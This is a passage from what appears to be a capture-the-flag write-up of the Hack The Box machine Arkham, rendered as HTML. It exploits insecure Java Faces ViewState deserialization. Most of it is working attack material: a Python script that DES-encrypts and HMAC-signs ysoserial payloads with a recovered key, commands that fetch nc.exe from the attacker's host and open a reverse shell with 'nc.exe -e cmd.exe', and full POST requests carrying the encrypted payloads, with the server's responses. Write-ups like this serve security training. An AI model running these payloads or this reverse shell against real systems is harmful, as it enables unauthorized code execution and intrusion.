class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    ----------------</span><br><span class="line">     Removed Output</span><br><span class="line">    ----------------</span><br></pre></td></tr></table></figure>
<p>The same key was used : <code>SnNGOTg3Ni0=</code>, it’s base-64 encoded so we need to decode it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# echo SnNGOTg3Ni0&#x3D; | base64 -d</span><br><span class="line">JsF9876-</span><br></pre></td></tr></table></figure>
<p>The key is <code>JsF9876-</code>.<br>We have everything we need to encrypt the data correctly, I wrote a python script to do it.<br>Basically I’m going to create the payload with <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"><code>ysoserial</code></a> then use my script to encrypt it.<br><code>viewstate.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload,key)</span>:</span></span><br><span class="line">	cipher = des(key, ECB, IV=<span class="literal">None</span>, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">	enc_payload = cipher.encrypt(payload)</span><br><span class="line">	<span class="keyword">return</span> enc_payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hmac_sig</span><span class="params">(enc_payload,key)</span>:</span></span><br><span class="line">	hmac_sig = hmac.new(key, enc_payload, sha1)</span><br><span class="line">	hmac_sig = hmac_sig.digest()</span><br><span class="line">	<span class="keyword">return</span> hmac_sig</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'JsF9876-'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span> :</span><br><span class="line">	print(YELLOW + <span class="string">"[!] Usage : &#123;&#125; [Payload File] [Output File]"</span>.format(sys.argv[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">		payload = f.read()</span><br><span class="line">		f.close()</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Encrypting payload"</span>)</span><br><span class="line">	print(YELLOW + <span class="string">"  [!] Key : JsF9876-\n"</span>)</span><br><span class="line">	enc_payload = encrypt(payload,key)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Creating HMAC signature"</span>)</span><br><span class="line">	hmac_sig = hmac_sig(enc_payload,key)</span><br><span class="line">	print(YELLOW + <span class="string">"[+] Appending signature to the encrypted payload\n"</span>)</span><br><span class="line">	payload = b64encode(enc_payload + hmac_sig)</span><br><span class="line">	payload = parse.quote_plus(payload)</span><br><span class="line">	print(YELLOW + <span class="string">"[*] Final payload : &#123;&#125;\n"</span>.format(payload))</span><br><span class="line">	<span class="keyword">with</span> open(sys.argv[<span class="number">2</span>], <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(payload)</span><br><span class="line">		f.close()</span><br><span class="line">	print(GREEN + <span class="string">"[*] Saved to : &#123;&#125;"</span>.format(sys.argv[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>
<p>This script has two functions, <code>encrypt()</code> and <code>hmac_sig()</code>, <code>encrypt()</code> takes the payload generated by <code>ysoserial</code> and <code>DES</code> encrypts it using the key then returns the encrypted payload. <code>hmac_sig()</code> takes the encrypted payload and generates the <code>hmac</code> signature that will be appended to the encrypted payload.<br>The script takes two arguments, first one is for the filename that contains the <code>ysoserial</code> generated payload, it encrypts it then generates the <code>hmac</code> signature, appends it to the encrypted payload, base-64 encodes the final payload and <code>url</code>-encodes it. Then it saves the payload into the output file which is the second argument.<br>Time to use <code>ysoserial</code>,  we run into the problem of which payload to use, I used <code>CommonsCollections5</code> and it worked.<br>I created two payloads, first one is to download <code>nc.exe</code> from my box and save it in <code>C:\windows\system32\spool\drivers\color</code>, second one is to execute the reverse shell command : <code>nc.exe -e cmd.exe 10.10.xx.xx 1337</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# java -jar ysoserial.jar CommonsCollections5 &#39;cmd.exe &#x2F;c powershell -c Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;&#39; &gt; uploadnc.payload</span><br><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;ysoserial.jar) to field javax.management.BadAttributeValueExpException.val</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5</span><br><span class="line">WARNING: Use --illegal-access&#x3D;warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham# java -jar ysoserial.jar CommonsCollections5 &#39;cmd.exe &#x2F;c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1337&#39; &gt; executenc.payload</span><br><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;ysoserial.jar) to field javax.management.BadAttributeValueExpException.val</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5</span><br><span class="line">WARNING: Use --illegal-access&#x3D;warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham#</span><br></pre></td></tr></table></figure>
<p>Then I encrypted them with my script :<br><img src="/images/hackthebox/arkham/10.png" alt=""><br>I ran a python server to host <code>nc.exe</code> and I started my <code>nc</code> listener on port 1337, then I sent the payloads.<br>1st Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/userSubscribe.faces</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arkham.htb:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://arkham.htb:8080/userSubscribe.faces</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 3197</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BTweGj5FUR%2FlCPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPSGioyPZd%2FiNpmNoUDeaeXEVrvY0L%2FaRMkBoThhoybIwKm9JRORG5quVg7mI39K3ANZaw6BBLyJDVbXmOcpydaV%2BJ4ehZuDU5EJNCdYdlqpK5IUgV5VNtTWO9f9YgPaneg14o%2B53eYRjgAQvWxmK%2FVII6JP9zUlbTzD60JeAbleovB8fLJf0D3aUv3mla%2B%2FLyWEXo2NfiqjFqPb9b4NHR199UdBVp6X2nev37%2Ftu0vBXvZz%2Bls4886hDPhV3RdASjsJaoZPrEReF8f43oev%2Bx6ZHIUdkCdk5uThniTrXeAWImx1USbtujkG0xSYdfK%2Fs8Az9gV7hyTmqI0ewkaYsX9uSA%2F9wVoArXnRX%2FrTg7PxMp9hGNKQN%2Fklr%2BXyc%3D</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">500</span> </span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=utf-8</span><br><span class="line"><span class="attribute">Content-Language</span>: en</span><br><span class="line"><span class="attribute">Content-Length</span>: 2570</span><br><span class="line"><span class="attribute">Date</span>: Fri, 09 Aug 2019 18:36:52 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 â Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 â Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)</span><br><span class="line">        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)</span><br><span class="line">        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)</span><br><span class="line">        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)</span><br><span class="line">        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)</span><br><span class="line">        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)</span><br><span class="line">        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)</span><br><span class="line">        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)</span><br><span class="line">        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)</span><br><span class="line">        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/8.5.37&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>I got a 500, and when I checked my python server I saw that I got a request so everything is fine.<br>2nd Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/userSubscribe.faces</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arkham.htb:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://arkham.htb:8080/userSubscribe.faces</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 3109</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">500</span> </span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=utf-8</span><br><span class="line"><span class="attribute">Content-Language</span>: en</span><br><span class="line"><span class="attribute">Content-Length</span>: 2570</span><br><span class="line"><span class="attribute">Date</span>: Fri, 09 Aug 2019 18:38:50 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 â Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 â Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the 